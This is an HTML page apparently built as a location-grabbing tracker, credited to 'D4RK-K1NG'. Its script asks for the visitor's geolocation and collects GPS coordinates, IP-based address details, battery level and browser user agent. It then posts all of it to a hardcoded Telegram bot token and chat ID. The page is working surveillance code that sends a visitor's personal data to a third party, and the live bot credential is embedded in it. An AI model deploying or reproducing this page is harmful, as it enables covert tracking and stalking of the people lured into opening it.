<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Location Share</title>
<style>
  body {
    background: radial-gradient(circle at center, #001f1f, #000);
    color: #00ffff;
    font-family: "Poppins", sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    text-align: center;
  }
  button {
    background: #00ffff;
    border: none;
    color: #000;
    padding: 14px 30px;
    border-radius: 10px;
    font-size: 18px;
    cursor: pointer;
    transition: 0.3s;
    font-weight: bold;
  }
  button:hover {
    background: #00cccc;
    transform: scale(1.05);
  }
  .box {
    background: rgba(0, 30, 30, 0.7);
    border: 2px solid #00ffff;
    border-radius: 15px;
    padding: 20px;
    width: 85%;
    max-width: 400px;
    margin-top: 20px;
    box-shadow: 0 0 15px #00ffff;
  }
  .footer {
    margin-top: 25px;
    font-size: 14px;
    color: #aaa;
    border-top: 1px solid #00aaaa;
    padding-top: 5px;
  }
</style>
</head>
<body>

<h2>ğŸ“ Send Your Location</h2>
<button onclick="sendLocation()">ğŸŒ Share Location</button>
<div id="info" class="box" style="display:none;"></div>
<div class="footer">ğŸ§  Developed by D4RK-K1NG</div>

<script>
async function sendLocation() {
  const infoBox = document.getElementById('info');
  infoBox.style.display = "block";
  infoBox.innerHTML = "Requesting permission...";

  if (!navigator.geolocation) {
    infoBox.innerHTML = "âŒ Geolocation not supported.";
    return;
  }

  navigator.geolocation.getCurrentPosition(async position => {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    let ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(()=>({}));
    let batteryInfo = await navigator.getBattery ? await navigator.getBattery() : null;
    let battery = batteryInfo ? Math.round(batteryInfo.level * 100) + "%" : "N/A";

    let time = new Date();
    let visitTime = time.toLocaleTimeString();
    let date = time.toLocaleDateString();

    const info = {
      country: ipData.country_name || "Unknown",
      state: ipData.region || "Unknown",
      city: ipData.city || "Unknown",
      town: ipData.org || "Unknown",
      pincode: ipData.postal || "Unknown",
      latitude: lat,
      longitude: lon,
      map: `https://www.google.com/maps?q=${lat},${lon}`,
      visitTime,
      date,
      ip: ipData.ip || "Unknown",
      battery,
      userAgent: navigator.userAgent
    };

    // Show on screen
    infoBox.innerHTML = `
      ğŸŒ <b>Country:</b> ${info.country}<br>
      ğŸ™ï¸ <b>State:</b> ${info.state}<br>
      ğŸŒ† <b>City:</b> ${info.city}<br>
      ğŸ˜ï¸ <b>Town:</b> ${info.town}<br>
      ğŸ§¾ <b>Pincode:</b> ${info.pincode}<br><br>
      ğŸ“¡ <b>Latitude:</b> ${info.latitude}<br>
      ğŸ§­ <b>Longitude:</b> ${info.longitude}<br>
      ğŸ—ºï¸ <b>On Map:</b> <a href="${info.map}" target="_blank">View</a><br><br>
      ğŸ•’ <b>Visited Time:</b> ${info.visitTime}<br>
      ğŸ“… <b>Date:</b> ${info.date}<br>
      ğŸŒ <b>IP:</b> ${info.ip}<br>
      ğŸ”‹ <b>Battery:</b> ${info.battery}<br>
      ğŸ’» <b>Used Web:</b> ${info.userAgent}<br>
    `;

    // Send to Telegram
    const token = "8177299368:AAEq8lA7DsfAM5tkR6kmF5rU-7Po6tuRq68";
    const chatId = "7109583573";

    const text = `
ğŸ“ *New Location Shared*
ğŸŒ Country: ${info.country}
ğŸ™ï¸ State: ${info.state}
ğŸŒ† City: ${info.city}
ğŸ˜ï¸ Town: ${info.town}
ğŸ§¾ Pincode: ${info.pincode}

ğŸ“¡ Latitude: ${info.latitude}
ğŸ§­ Longitude: ${info.longitude}
ğŸ—ºï¸ Map: ${info.map}

ğŸ•’ Time: ${info.visitTime}
ğŸ“… Date: ${info.date}
ğŸŒ IP: ${info.ip}
ğŸ”‹ Battery: ${info.battery}
ğŸ’» Used Web: ${info.userAgent}
`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "Markdown"
      })
    }).then(()=> {
      infoBox.innerHTML += "<br><br>âœ… Sent to Telegram successfully!";
    }).catch(()=> {
      infoBox.innerHTML += "<br><br>âš ï¸ Failed to send to Telegram.";
    });

  }, () => {
    infoBox.innerHTML = "âŒ Please allow location access to continue.";
  });
}
</script>
</body>
</html>
